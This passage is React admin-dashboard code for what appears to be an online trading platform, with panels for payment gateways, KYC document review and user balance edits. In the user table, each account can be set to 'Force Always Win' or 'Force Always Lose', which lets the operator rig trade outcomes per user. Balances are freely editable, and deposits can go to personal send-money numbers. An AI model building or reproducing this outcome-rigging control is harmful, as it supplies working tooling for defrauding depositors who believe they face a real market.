                          <tr key={u.email} className="hover:bg-white/[0.02]">
                            <td className="py-2.5 font-bold text-white font-mono">{u.email}</td>
                            <td className="py-2.5 font-mono text-emerald-400">${Number(u.balance || 0).toFixed(2)}</td>
                            <td className="py-2.5 text-right">
                              <select
                                value={currentOverride}
                                onChange={(e) => {
                                  const updatedOverrides = {
                                    ...(graphControls.userOverrides || {}),
                                    [u.email]: e.target.value
                                  };
                                  const updated = { ...graphControls, userOverrides: updatedOverrides };
                                  setGraphControls(updated);
                                  localStorage.setItem('qx_graph_controls', JSON.stringify(updated));
                                }}
                                className={`px-2.5 py-1 rounded-lg text-xs font-bold border ${
                                  currentOverride === 'always_win' ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40' :
                                  currentOverride === 'always_lose' ? 'bg-rose-500/20 text-rose-400 border-rose-500/40' :
                                  'bg-white/5 text-slate-300 border-white/10'
                                }`}
                              >
                                <option value="normal">Default Market</option>
                                <option value="always_win">Force Always Win 🟢</option>
                                <option value="always_lose">Force Always Lose 🔴</option>
                              </select>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'gateways' && (
          <div className="space-y-6 max-w-4xl">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-sm font-bold text-white flex items-center gap-2">
                  <CreditCard className="w-4 h-4 text-emerald-400" />
                  <span>Payment Gateway Configuration</span>
                </h2>
                <p className="text-xs text-slate-400 mt-1">Manage accepted payment methods, logos, minimum deposits, and instruction texts.</p>
              </div>
              <button
                onClick={() => {
                  setEditingGatewayIndex(gateways.length);
                  setGatewayForm({
                    id: `gateway_${Date.now()}`,
                    name: 'New Gateway',
                    category: 'mobile_banking',
                    type: 'both', // 'deposit' | 'withdrawal' | 'both'
                    icon: '',
                    active: true,
                    sendMoneyNumber: '',
                    merchantNumber: '',
                    cashOutNumber: '',
                    instruction: '',
                    minDeposit: 10,
                    maxDeposit: 1000,
                    minWithdrawal: 10,
                    maxWithdrawal: 5000,
                    fee: 0
                  });
                }}
                className="px-3 py-1.5 bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500 hover:text-black rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-2 border border-emerald-500/30 hover:border-transparent"
              >
                <PlusCircle className="w-3.5 h-3.5" />
                <span>Add Gateway</span>
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {gateways.map((gateway, index) => (
                <div key={gateway.id} className="bg-[#121824] border border-white/10 rounded-2xl p-4 flex flex-col justify-between">
                  <div>
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        {gateway.icon ? (
                          <img src={gateway.icon} alt={gateway.name} className="w-10 h-10 object-contain rounded bg-white/5 p-1" />
                        ) : (
                          <div className="w-10 h-10 bg-white/5 rounded flex items-center justify-center">
                            <CreditCard className="w-5 h-5 text-slate-400" />
                          </div>
                        )}
                        <div>
                          <div className="flex items-center gap-2">
                            <h3 className="text-sm font-bold text-white">{gateway.name}</h3>
                            <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider ${
                              gateway.type === 'withdrawal' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
                              gateway.type === 'both' ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30' :
                              'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            }`}>
                              {gateway.type === 'withdrawal' ? 'Withdraw Only' : gateway.type === 'both' ? 'Deposit & Withdraw' : 'Deposit Only'}
                            </span>
                            {!gateway.active && (
                              <span className="px-1.5 py-0.5 bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded text-[9px] font-bold uppercase tracking-wider">
                                Inactive
                              </span>
                            )}
                          </div>
                          <p className="text-[10px] text-slate-400 capitalize">{gateway.category.replace('_', ' ')}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => {
                            setEditingGatewayIndex(index);
                            setGatewayForm({ ...gateway });
                          }}
                          className="p-1.5 bg-white/5 hover:bg-white/10 text-slate-300 rounded-lg transition-colors cursor-pointer"
                        >
                          <Edit3 className="w-4 h-4" />
                        </button>
                        <button
                          onClick={async () => {
                            if (window.confirm('Are you sure you want to delete this gateway?')) {
                              const newGateways = [...gateways];
                              newGateways.splice(index, 1);
                              setGateways(newGateways);
                              await FirebaseService.syncGateways(newGateways);
                            }
                          }}
                          className="p-1.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 rounded-lg transition-colors cursor-pointer"
                        >
                          <X className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                    <div className="space-y-1.5 text-xs text-slate-300">
                      <div className="flex justify-between">
                        <span className="text-slate-500">Deposit Limits:</span>
                        <span className="font-mono">${gateway.minDeposit || 10} - ${gateway.maxDeposit || 1000}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500">Withdrawal Limits:</span>
                        <span className="font-mono text-amber-400">${gateway.minWithdrawal || 10} - ${gateway.maxWithdrawal || 5000}</span>
                      </div>
                      {gateway.sendMoneyNumber && (
                        <div className="flex justify-between">
                          <span className="text-slate-500">Send Money:</span>
                          <span className="font-mono text-emerald-400">{gateway.sendMoneyNumber}</span>
                        </div>
                      )}
                      {gateway.merchantNumber && (
                        <div className="flex justify-between">
                          <span className="text-slate-500">Merchant:</span>
                          <span className="font-mono text-emerald-400">{gateway.merchantNumber}</span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Gateway Management Modal */}
      {editingGatewayIndex !== null && (
        <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#121824] border border-white/10 rounded-2xl w-full max-w-lg shadow-2xl flex flex-col max-h-[90vh]">
            <div className="flex items-center justify-between p-4 border-b border-white/10 shrink-0">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <CreditCard className="w-4 h-4 text-emerald-400" />
                <span>{editingGatewayIndex === gateways.length ? 'Add New Gateway' : 'Edit Payment Gateway'}</span>
              </h3>
              <button 
                onClick={() => setEditingGatewayIndex(null)}
                className="p-1.5 hover:bg-white/5 rounded-lg text-slate-400 hover:text-white transition-colors cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
            
            <div className="p-4 overflow-y-auto space-y-4">
              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Gateway Name</label>
                  <input
                    type="text"
                    value={gatewayForm.name || ''}
                    onChange={(e) => setGatewayForm({...gatewayForm, name: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                    placeholder="e.g. bKash (BD)"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Category</label>
                  <select
                    value={gatewayForm.category || 'mobile_banking'}
                    onChange={(e) => setGatewayForm({...gatewayForm, category: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                  >
                    <option value="mobile_banking">Mobile Banking</option>
                    <option value="crypto">Cryptocurrency</option>
                    <option value="bank">Bank Transfer</option>
                    <option value="wallet">E-Wallet</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Gateway Purpose</label>
                  <select
                    value={gatewayForm.type || 'both'}
                    onChange={(e) => setGatewayForm({...gatewayForm, type: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-bold"
                  >
                    <option value="deposit">Deposit Only</option>
                    <option value="withdrawal">Withdrawal Only</option>
                    <option value="both">Both (Deposit & Withdrawal)</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 mb-1">Gateway Logo Image URL</label>
                <input
                  type="text"
                  value={gatewayForm.icon || ''}
                  onChange={(e) => setGatewayForm({...gatewayForm, icon: e.target.value})}
                  className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                  placeholder="https://i.postimg.cc/..."
                />
              </div>

              {/* Deposit Limits */}
              <div className="p-3 bg-white/5 border border-white/10 rounded-xl space-y-2">
                <h4 className="text-xs font-bold text-emerald-400">Deposit Limits</h4>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1">Min Deposit ($)</label>
                    <input
                      type="number"
                      value={gatewayForm.minDeposit || 10}
                      onChange={(e) => setGatewayForm({...gatewayForm, minDeposit: Number(e.target.value)})}
                      className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1">Max Deposit ($)</label>
                    <input
                      type="number"
                      value={gatewayForm.maxDeposit || 1000}
                      onChange={(e) => setGatewayForm({...gatewayForm, maxDeposit: Number(e.target.value)})}
                      className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>
              </div>

              {/* Withdrawal Limits */}
              <div className="p-3 bg-white/5 border border-white/10 rounded-xl space-y-2">
                <h4 className="text-xs font-bold text-amber-400">Withdrawal Limits</h4>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1">Min Withdrawal ($)</label>
                    <input
                      type="number"
                      value={gatewayForm.minWithdrawal || 10}
                      onChange={(e) => setGatewayForm({...gatewayForm, minWithdrawal: Number(e.target.value)})}
                      className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1">Max Withdrawal ($)</label>
                    <input
                      type="number"
                      value={gatewayForm.maxWithdrawal || 5000}
                      onChange={(e) => setGatewayForm({...gatewayForm, maxWithdrawal: Number(e.target.value)})}
                      className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>
              </div>

              <div className="space-y-3 pt-2 border-t border-white/10">
                <h4 className="text-xs font-bold text-white">Payment Numbers</h4>
                
                <div>
                  <label className="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Send Money (Personal)</label>
                  <input
                    type="text"
                    value={gatewayForm.sendMoneyNumber || ''}
                    onChange={(e) => setGatewayForm({...gatewayForm, sendMoneyNumber: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    placeholder="Enter number (optional)"
                  />
                </div>
                <div>
                  <label className="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Merchant (Payment)</label>
                  <input
                    type="text"
                    value={gatewayForm.merchantNumber || ''}
                    onChange={(e) => setGatewayForm({...gatewayForm, merchantNumber: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    placeholder="Enter number (optional)"
                  />
                </div>
                <div>
                  <label className="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Cash Out (Agent)</label>
                  <input
                    type="text"
                    value={gatewayForm.cashOutNumber || ''}
                    onChange={(e) => setGatewayForm({...gatewayForm, cashOutNumber: e.target.value})}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    placeholder="Enter number (optional)"
                  />
                </div>
              </div>

              <div className="pt-2 border-t border-white/10">
                <label className="block text-xs font-bold text-slate-300 mb-1">Payment Instructions</label>
                <textarea
                  value={gatewayForm.instruction || ''}
                  onChange={(e) => setGatewayForm({...gatewayForm, instruction: e.target.value})}
                  className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 min-h-[60px]"
                  placeholder="Enter instructions for users..."
                />
              </div>

              <label className="flex items-center space-x-2 pt-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={gatewayForm.active ?? true}
                  onChange={(e) => setGatewayForm({...gatewayForm, active: e.target.checked})}
                  className="w-4 h-4 rounded border-white/20 bg-[#0a0e17] text-emerald-500 focus:ring-emerald-500 focus:ring-offset-[#121824]"
                />
                <span className="text-xs font-bold text-white">Gateway Active</span>
              </label>
            </div>

            <div className="flex items-center justify-end space-x-3 p-4 border-t border-white/10 shrink-0">
              <button
                onClick={() => setEditingGatewayIndex(null)}
                className="px-4 py-2 bg-white/5 hover:bg-white/10 text-slate-300 rounded-xl text-xs font-bold cursor-pointer transition-all"
              >
                Cancel
              </button>
              <button
                onClick={async () => {
                  const newGateways = [...gateways];
                  if (editingGatewayIndex === gateways.length) {
                    newGateways.push(gatewayForm);
                  } else {
                    newGateways[editingGatewayIndex] = gatewayForm;
                  }
                  
                  setGateways(newGateways);
                  await FirebaseService.syncGateways(newGateways);
                  setEditingGatewayIndex(null);
                }}
                className="px-5 py-2 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-black rounded-xl shadow-lg shadow-emerald-500/20 cursor-pointer transition-all"
              >
                Save Gateway
              </button>
            </div>
          </div>
        </div>
      )}

      {/* KYC Documents Review Tab */}
      {activeTab === 'kyc' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-sm font-bold text-white">Identity Document (KYC) Verification Requests</h2>
              <p className="text-xs text-slate-400">Review uploaded National ID, Passport, and Driving License photos</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {users.filter(u => u.kycStatus || u.kycFrontImg).length === 0 ? (
              <div className="col-span-2 p-12 text-center text-slate-500 bg-[#121824] border border-white/10 rounded-2xl">
                No pending KYC document submissions found in Firestore users.
              </div>
            ) : (
              users.filter(u => u.kycStatus || u.kycFrontImg).map((u, i) => (
                <div key={u.id || i} className="bg-[#121824] border border-white/10 rounded-2xl p-5 space-y-4 shadow-xl">
                  <div className="flex items-center justify-between border-b border-white/10 pb-3">
                    <div>
                      <div className="font-bold text-white text-xs">{u.email}</div>
                      <div className="text-[10px] text-slate-400 font-mono">Doc Type: <span className="uppercase text-emerald-400">{u.kycDocType || 'NID'}</span></div>
                    </div>
                    <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase ${
                      u.kycStatus === 'verified' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' :
                      u.kycStatus === 'rejected' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' :
                      'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                    }`}>
                      {u.kycStatus || 'pending'}
                    </span>
                  </div>

                  {/* Images Display */}
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <div className="text-[10px] font-bold text-slate-400 mb-1">Front Photo</div>
                      {u.kycFrontImg ? (
                        <img src={u.kycFrontImg} alt="Front Document" className="w-full h-32 object-cover rounded-xl border border-white/10" />
                      ) : (
                        <div className="w-full h-32 bg-white/5 rounded-xl border border-white/10 flex items-center justify-center text-xs text-slate-500">No Front Image</div>
                      )}
                    </div>
                    <div>
                      <div className="text-[10px] font-bold text-slate-400 mb-1">Back Photo</div>
                      {u.kycBackImg ? (
                        <img src={u.kycBackImg} alt="Back Document" className="w-full h-32 object-cover rounded-xl border border-white/10" />
                      ) : (
                        <div className="w-full h-32 bg-white/5 rounded-xl border border-white/10 flex items-center justify-center text-xs text-slate-500">N/A</div>
                      )}
                    </div>
                  </div>

                  {/* Actions */}
                  <div className="flex items-center justify-end space-x-2 pt-2 border-t border-white/5">
                    <button
                      onClick={async () => {
                        const updated = { ...u, kycStatus: 'rejected', verificationStatus: 'unverified' };
                        await FirebaseService.syncUser(updated);
                        loadAdminData();
                      }}
                      className="px-3 py-1.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded-xl text-xs font-bold cursor-pointer transition-all"
                    >
                      Reject Document
                    </button>
                    <button
                      onClick={async () => {
                        const updated = { ...u, kycStatus: 'verified', verificationStatus: 'verified' };
                        await FirebaseService.syncUser(updated);
                        loadAdminData();
                      }}
                      className="px-4 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-black rounded-xl text-xs font-black shadow-lg shadow-emerald-500/20 cursor-pointer transition-all"
                    >
                      Approve Verification
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* Edit Balance / Bonus Modal */}
      {managingUser && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-[#121824] border border-white/10 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-white/10 pb-4">
              <div>
                <h3 className="text-sm font-black text-white">Manage User Account</h3>
                <p className="text-xs text-slate-400 font-mono">{managingUser.email}</p>
              </div>
              <button 
                onClick={() => setManagingUser(null)}
                className="w-8 h-8 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center text-slate-400 hover:text-white cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-300 mb-1">Custom Live Balance ($)</label>
                <div className="relative">
                  <DollarSign className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
                  <input
                    type="number"
                    step="any"
                    value={customBalanceInput}
                    onChange={(e) => setCustomBalanceInput(e.target.value)}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl pl-10 pr-4 py-2.5 text-xs text-white font-mono font-bold focus:outline-none focus:border-emerald-500"
                  />
                </div>
                <div className="flex items-center gap-2 mt-2">
                  <button
                    onClick={() => {
                      const curr = parseFloat(customBalanceInput) || 0;
                      setCustomBalanceInput(String(curr + 50));
                    }}
                    className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-[10px] font-bold cursor-pointer"
                  >
                    + $50
                  </button>
                  <button
                    onClick={() => {
                      const curr = parseFloat(customBalanceInput) || 0;
                      setCustomBalanceInput(String(curr + 100));
                    }}
                    className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-[10px] font-bold cursor-pointer"
                  >
                    + $100
                  </button>
                  <button
                    onClick={() => {
                      const curr = parseFloat(customBalanceInput) || 0;
                      setCustomBalanceInput(String(Math.max(0, curr - 50)));
                    }}
                    className="px-2.5 py-1 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded-lg text-[10px] font-bold cursor-pointer"
                  >
                    - $50
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 mb-1">Bonus Amount ($)</label>
                <div className="relative">
                  <Gift className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-amber-400" />
                  <input
                    type="number"
                    step="any"
                    value={bonusInput}
                    onChange={(e) => setBonusInput(e.target.value)}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl pl-10 pr-4 py-2.5 text-xs text-white font-mono font-bold focus:outline-none focus:border-emerald-500"
                  />
                </div>
              </div>

              <div className="flex items-center justify-end space-x-3 pt-4 border-t border-white/10">
                <button
                  onClick={() => setManagingUser(null)}
                  className="px-4 py-2 bg-white/5 hover:bg-white/10 text-slate-300 rounded-xl text-xs font-bold cursor-pointer transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleSaveUserManagement}
                  className="px-5 py-2 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-black rounded-xl shadow-lg shadow-emerald-500/20 cursor-pointer transition-all"
                >
                  Save Changes
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
